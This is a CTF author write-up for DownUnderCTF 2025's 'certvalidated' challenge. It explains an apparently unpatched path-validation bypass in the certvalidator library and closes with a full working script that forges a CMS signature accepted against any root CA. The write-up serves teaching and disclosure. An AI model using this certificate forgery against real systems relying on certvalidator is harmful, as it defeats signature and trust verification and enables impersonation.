---
path: /posts/2025-08-12-downunderctf-2025-certvalidated
title: DownUnderCTF 2025 - certvalidated
date: 2025-08-12
tags: ctf,writeup,crypto
---

This is an author writeup of certvalidated from DownUnderCTF 2025. This
challenge involved finding and exploiting a 0day vulnerability in the Python
X.509 library [certvalidator](https://github.com/wbond/certvalidator/) (which
appears to be unmaintained, and the author did not respond to an attempted
security report).

I had inaccurately rated this challenge's difficulty as medium, as at the end
of the CTF there were only two solves.

# Challenge Overview

The following files were provided to players:

`Dockerfile`:

```dockerfile
FROM ubuntu:22.04

RUN apt-get update \
    && apt-get install -y wget socat python3-pip swig \
    && rm -r /var/lib/apt/lists/*

RUN pip install endesive==2.18.5

USER 1000
WORKDIR /home/ctf

COPY ./flag.txt /home/ctf/
COPY ./root.crt /home/ctf/
COPY ./certvalidated.py /home/ctf/certvalidated.py

COPY --chmod=755 entrypoint.sh /home/ctf/entrypoint.sh
ENTRYPOINT ["/home/ctf/entrypoint.sh"]
```

`certvalidated.py`:

```py
#!/usr/bin/env python3

import base64
from endesive import plain

TO_SIGN = 'just a random hex string: af17a1f2654d3d40f532e314c7347cfaf24af12be4b43c5fc95f9fb98ce74601'
DUCTF_ROOT_CA = open('./root.crt', 'rb').read()

print(f'Sign this! <<{TO_SIGN}>>')
content_info = base64.b64decode(input('Your CMS blob (base64): '))

hashok, signatureok, certok = plain.verify(content_info, TO_SIGN.encode(), [DUCTF_ROOT_CA])

print(f'{hashok = }')
print(f'{signatureok = }')
print(f'{certok = }')

if all([hashok, signatureok, certok]):
    print(open('flag.txt', 'r').read())
```

`entrypoint.sh`:

```sh
#!/usr/bin/env bash
socat -dd TCP-LISTEN:1337,reuseaddr,fork EXEC:./certvalidated.py
```

`root.crt`:

```
-----BEGIN CERTIFICATE-----
MIIDgzCCAmugAwIBAgIUe6f2tO34vYWqh/bz8BfNUdZpK8gwDQYJKoZIhvcNAQEL
BQAwUTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUxFTATBgNVBAoM
DERvd25VbmRlckNURjEWMBQGA1UEAwwNRFVDVEYgUm9vdCBDQTAeFw0yNTA3MDQw
OTU4MTJaFw0yNjA3MDQwOTU4MTJaMFExCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApT
b21lLVN0YXRlMRUwEwYDVQQKDAxEb3duVW5kZXJDVEYxFjAUBgNVBAMMDURVQ1RG
IFJvb3QgQ0EwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDY10s/2DsA
/1lfdnCiINf4ZZWguWRsdNo8xKZqm3i0hlWudiTVMlhRh8dBYl0YOA4bx06nL6cO
BT7NEV/wqZUiIcpDgtHAX/+ZWP3p5QM0rmk5nN5b3C8jIpjugjHifmooSCYRBFq9
hKMYdCsogYPwnINMDJ40MCIYsK54FRKV5PBSoC5bEjJ1KidZoGGKcMsbowTz1Rrz
4zZiZP4rJTF+uJGLdagpDB/9fN5xkmoTTCU6g2uoSMr0/BE+rxqdDMM42ecdhedM
mSp1F6yv88gW9vrINEnXUVUVK2EFbN6ljdAK4kPGHCEYKotruuJy66DpYriG1mrX
ZmHS1OZtSCw/AgMBAAGjUzBRMB0GA1UdDgQWBBTQt4qQPkvjMD2aaxDg/BTrl5P/
izAfBgNVHSMEGDAWgBTQt4qQPkvjMD2aaxDg/BTrl5P/izAPBgNVHRMBAf8EBTAD
AQH/MA0GCSqGSIb3DQEBCwUAA4IBAQAMqOr/YShwJA0+GQ/GrRHkclNaamDkGNws
vklbTxMjloMmbMCJW5L0+bgl9c5Rk3Q7fGk8bWZ5mOadr7xQUqjuBHHGoKZ3Y2v/
Q6XSJ8JAnxIR/+HH+zePmHxOXRFEVdVe1uLlIMJWMu0mtPbvzxRHDH0j4t09dgcL
wE+de8+cUIa9E2yD/gnnuHl5L9nHWoZPZDu3KTohRfSYAux3sEZpbAnwPwBh7bic
H5mxH27Bx2SRELIA6NgVi5J3DHbEEUUEVxkgHzu7AoNa8zCgV0s0n/qjmF1U1DND
Zh1EkpMUUAvf1CFRHhlcM3JuqVUoCVuHDtY9fUGHMQbQR7b2dfBo
-----END CERTIFICATE-----
```

The server prompts the player for a CMS blob, and then uses
[endesive](https://github.com/m32/endesive/) to verify that it signs the
challenge message with a certificate chaining back to the giving root
certificate. As of version 2.18.5, endesive used certvalidator for performing
the chain validation.

The challenge revolves around Cryptographic Message Syntax (CMS), so reading
[RFC 5652](https://www.rfc-editor.org/rfc/rfc5652) is highly recommended. In
summary, CMS (as used in the challenge) is a PKI standard used to validate that
a message is signed by an entity which is cryptographically tied to some root
entity (which has some externally established level of trust). These root
entities are typically embedded in software or operating systems and take the
form of certificates, which encompass (among other things) a subject name and a
public key - the private key of which is held by the corresponding real world
entity. Some examples include the [Let's Encrypt ISRG Root X1 certificate](https://letsencrypt.org/certificates/)
or [Google's GTS Root R1 certificate](https://pki.goog/repository/).
These kinds of certificates are responsible for signing intermediary
certificates which themselves can sign more intermediary or leaf certificates
which may then sign messages to be verified by applications. Verification
therefore involves building a chain of certificates going from the leaf
certificate all the way to a root certificate within the application or
operating system's store of trusted root certificates.

CMS is used everywhere, such as in TLS and verifying software on your favourite
mobile operating systems.

# Solution <a name="solution"></a>

Solving the challenge involves finding a vulnerability in the way CMS
validation is performed in the certvalidator library. One such vulnerability is
given below.

## X.509 certificate path validation bypass in `certvalidator`

A path validation bypass in `certvalidator` was found that affects both the
release on PyPi and the latest commit on GitHub master branch. The bypass
allows any attacker-provided certificate (which is the expected usage) to have
a path validated against any root CA even if the certificate was never signed
by the root CA. As an example, the following usage (taken from
https://github.com/wbond/certvalidator/blob/master/docs/usage.md) is
vulnerable, assuming the `end_entity_cert` is untrusted:

```py
from certvalidator import CertificateValidator, errors


with open('/path/to/cert.crt', 'rb') as f:
    end_entity_cert = f.read()

try:
    validator = CertificateValidator(end_entity_cert)
    validator.validate_usage(set(['digital_signature']))
except (errors.PathValidationError):
    # The certificate could not be validated
```

### Vulnerability Details

The API methods `CertificateValidator.validate_tls` and
`CertificateValidator.validate_usage` both call an internal method which builds
and validates the path.

The paths are built by the `CertificateRegistry` class which may be populated
with either the operating system's list of root CAs, a user-provided list, or
both. The `CertificateRegistry.build_paths` method takes a single end-entity
certificate and returns a list of possible certificate paths from any of the
trusted CAs to the end-entity certificate (optionally going through
intermediate certificates if provided in the registry).

The path building is implemented as follows:

```py
class CertificateRegistry():
    # ...

    def build_paths(self, end_entity_cert):
        """
        Builds a list of ValidationPath objects from a certificate in the
        operating system trust store to the end-entity certificate

        :param end_entity_cert:
            A byte string of a DER or PEM-encoded X.509 certificate, or an
            instance of asn1crypto.x509.Certificate

        :return:
            A list of certvalidator.path.ValidationPath objects that represent
            the possible paths from the end-entity certificate to one of the CA
            certs.
        """

        if not isinstance(end_entity_cert, byte_cls) and not isinstance(end_entity_cert, x509.Certificate):
            raise TypeError(pretty_message(
                '''
                end_entity_cert must be a byte string or an instance of
                asn1crypto.x509.Certificate, not %s
                ''',
                type_name(end_entity_cert)
            ))

        if isinstance(end_entity_cert, byte_cls):
            if pem.detect(end_entity_cert):
                _, _, end_entity_cert = pem.unarmor(end_entity_cert)
            end_entity_cert = x509.Certificate.load(end_entity_cert)

        path = ValidationPath(end_entity_cert)
        paths = []
        failed_paths = []

        self._walk_issuers(path, paths, failed_paths) # [1]

        if len(paths) == 0:
            cert_name = end_entity_cert.subject.human_friendly
            missing_issuer_name = failed_paths[0].first.issuer.human_friendly
            raise PathBuildingError(pretty_message(
                '''
                Unable to build a validation path for the certificate "%s" - no
                issuer matching "%s" was found
                ''',
                cert_name,
                missing_issuer_name
            ))

        return paths

    def _walk_issuers(self, path, paths, failed_paths):
        """
        Recursively looks through the list of known certificates for the issuer
        of the certificate specified, stopping once the certificate in question
        is one contained within the CA certs list

        :param path:
            A ValidationPath object representing the current traversal of
            possible paths

        :param paths:
            A list of completed ValidationPath objects. This is mutated as
            results are found.

        :param failed_paths:
            A list of certvalidator.path.ValidationPath objects that failed due
            to no matching issuer before reaching a certificate from the CA
            certs list
        """

        if path.first.signature in self._ca_lookup: # [2]
            paths.append(path)
            return

        new_branches = 0
        for issuer in self._possible_issuers(path.first):
            try:
                self._walk_issuers(path.copy().prepend(issuer), paths, failed_paths)
                new_branches += 1
            except (DuplicateCertificateError):
                pass

        if not new_branches:
            failed_paths.append(path)
```

At `[1]`, the `build_paths` method calls the internal `_walk_issuers` method to
recursively populate the `paths` variable with possible paths. The `path`
variable is initialised to a `ValidationPath` consisting of just the end-entity
certificate since it is reasonably assumed to be part of any possible path.

Paths built by the `_walk_issuers` method are such that a certificate's issuer
appears just before the certificate itself in the list. As a result, the
recursive method terminates at the base case when the first element in the path
is a root CA (and therefore presumably self-issued). This base case is handled
at `[2]`, where the check is performed is by checking that the _signature_ of
the certificate matches any of the root CAs.

This check to determine whether the certificate is a root CA is flawed as the
signature does not encompass the entirety of the root CA's `tbsCertificate`
which contains important details about the certificate, including its subject,
public key and any extensions. In the main path validation function
`_validate_path` defined in `validate.py`, no cryptographic verifications are
performed as the path contains a single certificate which is assumed to be the
(self-signed) trust anchor (comments `# ...` indicate irrelevant omitted code):

```py
def _validate_path(validation_context, path, end_entity_name_override=None):
    """
    Internal copy of validate_path() that allows overriding the name of the
    end-entity certificate as used in exception messages. This functionality is
    used during chain validation when dealing with indirect CRLs issuer or
    OCSP responder certificates.

    :param validation_context:
        A certvalidator.context.ValidationContext object to use for
        configuring validation behavior

    :param path:
        A certvalidator.path.ValidationPath object of the path to validate

    :param end_entity_name_override:
        A unicode string of the name to use for the final certificate in the
        path. This is necessary when dealing with indirect CRL issuers or
        OCSP responder certificates.

    :return:
        The final certificate in the path - an instance of
        asn1crypto.x509.Certificate
    """

    # ...

    trust_anchor = path.first

    # We skip the trust anchor when measuring the path since technically
    # the trust anchor is not part of the path
    path_length = len(path) - 1

    # ...

    # Step 2: basic processing
    index = 1
    last_index = len(path) - 1

    completed_path = ValidationPath(trust_anchor)
    validation_context.record_validation(trust_anchor, completed_path)

    cert = trust_anchor
    while index <= last_index:
        cert = path[index]

        # perform signature verification on certificates
        # ...

        index += 1

    # ...

    return cert
```

This results in a scenario where an attacker can provide an end-entity
certificate that may bypass path validation (by having its signature field set
to that of a trusted root CA), despite never having been signed by the root CA.
Additionally, any important details contained within the `tbsCertificate` which
may be consumed by an application (such as the certificate's subject, public
key and extensions) can be fully controlled.

## Solution Script

So to solve the challenge, we just need to craft a CMS message with the
signer's certificate having the same signature as the root certificate:

```py
from pwn import process, remote
from base64 import b64encode
from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.x509.oid import NameOID
from asn1crypto import cms, x509 as ax509
import datetime

def create_cert(subject, pubkey=None, issuer=None, issuer_privkey=None):
    one_day = datetime.timedelta(1, 0, 0)
    if type(subject) == str:
        subject = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, subject)])
    private_key = None
    if pubkey is None:
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
        )
        pubkey = private_key.public_key()

        if issuer is None:
            assert issuer_privkey is None
            issuer_privkey = private_key
            issuer = subject

        if issuer_privkey is None:
            issuer_privkey = private_key

    assert issuer is not None and issuer_privkey is not None

    builder = x509.CertificateBuilder()
    builder = builder.subject_name(subject)
    builder = builder.issuer_name(issuer)
    builder = builder.not_valid_before(datetime.datetime.today() - one_day)
    builder = builder.not_valid_after(datetime.datetime.today() + (one_day * 30))
    builder = builder.serial_number(x509.random_serial_number())
    builder = builder.public_key(pubkey)
    builder = builder.add_extension(x509.KeyUsage(
        digital_signature=True,
        content_commitment=False,
        key_encipherment=False,
        data_encipherment=False,
        key_agreement=False,
        key_cert_sign=False,
        crl_sign=False,
        encipher_only=False,
        decipher_only=False
    ), critical=True)
    certificate = builder.sign(private_key=issuer_privkey, algorithm=hashes.SHA256())
    return certificate, private_key or issuer_privkey


root_crt = x509.load_pem_x509_certificate(open('../publish/root.crt', 'rb').read())
my_crt, my_key = create_cert('my cert', pubkey=None, issuer=root_crt.issuer, issuer_privkey=None)

my_crt_der = my_crt.public_bytes(serialization.Encoding.DER)
root_crt_der = root_crt.public_bytes(serialization.Encoding.DER)

my_crt_kid = cms.Certificate.load(my_crt_der).public_key.sha1

# conn = process(['python3', './chal.py'])
conn = remote('0.0.0.0', 1337)
to_sign = conn.recvline().decode().split('<<')[1].split('>>')[0].encode()

sig = my_key.sign(to_sign, padding.PKCS1v15(), hashes.SHA256())
sd = cms.SignedData({
    'version': 'v1',
    'encap_content_info': {
        'content_type': 'data',
        'content': to_sign
    },
    'digest_algorithms': [
        {
            'algorithm': 'sha256',
            'parameters': None
        }
    ],
    'certificates': [
        cms.CertificateChoices.load(my_crt_der.replace(my_crt.signature, root_crt.signature)),
    ],
    'signer_infos': [
        {
            'version': 'v1',
            'digest_algorithm': {
                'algorithm': 'sha256',
                'parameters': None
            },
            'signature_algorithm': {
                'algorithm': 'sha256_rsa',
                'parameters': None
            },
            'signature': sig,
            'sid': cms.IssuerAndSerialNumber({
                'issuer': ax509.Name.load(my_crt.issuer.public_bytes()),
                'serial_number': my_crt.serial_number
            })
        }
    ]
})
ci = cms.ContentInfo({
    'content_type': 'signed_data',
    'content': sd
})

conn.sendlineafter(b'Your CMS blob (base64): ', b64encode(ci.dump()))
conn.interactive()
```
